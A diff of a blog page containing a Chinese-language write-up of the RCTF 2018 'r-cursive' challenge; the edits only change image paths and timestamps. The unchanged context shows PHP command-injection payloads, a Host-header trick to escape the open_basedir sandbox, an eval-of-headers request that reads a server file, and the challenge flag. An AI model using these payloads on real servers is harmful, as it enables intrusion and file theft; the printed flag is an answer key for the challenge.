@@ -87,16 +87,16 @@
 <meta property="og:site_name" content="m3lon">
 <meta property="og:description" content="题目源码： 1234567891011121314151617&amp;lt;?php$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;is_dir($dir) ?: mkdir($dir);is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/1.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/2.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/3.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/4.png">
-<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/5.png">
-<meta property="og:updated_time" content="2018-05-29T02:46:39.988Z">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/2.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/3.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/4.png">
+<meta property="og:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/5.png">
+<meta property="og:updated_time" content="2019-02-21T12:04:19.353Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF 2018 r-cursive wp">
 <meta name="twitter:description" content="题目源码： 1234567891011121314151617&amp;lt;?php$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;is_dir($dir) ?: mkdir($dir);is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php">
-<meta name="twitter:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/RCTF-r-cursive-wp/1.png">
+<meta name="twitter:image" content="http://m3lon.github.io/2018/05/29/RCTF-r-cursive-wp/1.png">
 
 
 
@@ -406,7 +406,7 @@
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=<span class="built_in">print</span>(phpinfo());</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(readdir(opendir(getcwd()))); 可以列目录</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(readfile(readdir(opendir(getcwd())))); 读文件</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(dirname(dirname(getcwd()))); <span class="built_in">print</span>出/var/www</span></span><br></pre></td></tr></table></figure>
 <p><strong>0x02</strong>  沙盒绕过</p>
 <p><code>?cmd=print(phpinfo());</code>发现</p>
-<p><img src="RCTF-r-cursive-wp/1.png" alt=""></p>
+<p><img src="1.png" alt=""></p>
 <p>学习两个小知识</p>
 <p><code>mod_vhost_alias</code></p>
 <blockquote>
@@ -421,18 +421,18 @@
 <p>所以这里通过修改host来修改沙盒的open_basedir。目的：先逃逸后读取</p>
 <ol>
 <li><p>正常的open_basedir()</p>
-<p><img src="RCTF-r-cursive-wp/2.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
 </li>
 </ol>
 <ol>
 <li><p>访问webroot下的open_basedir()</p>
-<p><img src="RCTF-r-cursive-wp/3.png" alt=""></p>
+<p><img src="3.png" alt=""></p>
 </li>
 </ol>
 <p>403是因为webroot(/var/www/sandbox/)没有index.php，正好说明已经逃逸出了沙盒<br>所以去访问39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php 即可调用命令</p>
 <ol>
 <li><p>借用/39093088bf9a9d33d5dd5b973cc1232e2145ee49/index.php来执行命令</p>
-<p><img src="RCTF-r-cursive-wp/4.png" alt=""></p>
+<p><img src="4.png" alt=""></p>
 </li>
 </ol>
 <p>之所以可以借用，是由于这几句代码</p>
@@ -442,7 +442,7 @@
 <p>现在已经经open_basedir修改为/var/www/sandbox/了，于是读取init.php</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="number">269577</span>e99009788991126ac76f84c473aa02192f/index.php?<span class="keyword">cmd</span><span class="bash">=<span class="built_in">eval</span>(implode(getallheaders())); HTTP/1.1</span></span><br><span class="line"><span class="bash">cmd: <span class="built_in">echo</span> ini_get(<span class="string">"open_basedir"</span>);<span class="variable">$m3lon</span> = readfile(<span class="string">"/var/www/sandbox/init.php"</span>);<span class="built_in">print</span> <span class="variable">$m3lon</span>;//</span></span><br><span class="line"><span class="bash">Host:  .r-cursive.ml</span></span><br><span class="line"><span class="bash">Content-Length: 2</span></span><br></pre></td></tr></table></figure>
 <p>​</p>
-<p><img src="RCTF-r-cursive-wp/5.png" alt=""></p>
+<p><img src="5.png" alt=""></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">"open_basedir"</span>, $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">"/:/tmp/"</span>);</span><br><span class="line">    <span class="comment">// flag: RCTF&#123;apache_mod_vhost_alias_should_be_configured_correctly&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>​</p>
 </li>
@@ -588,7 +588,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
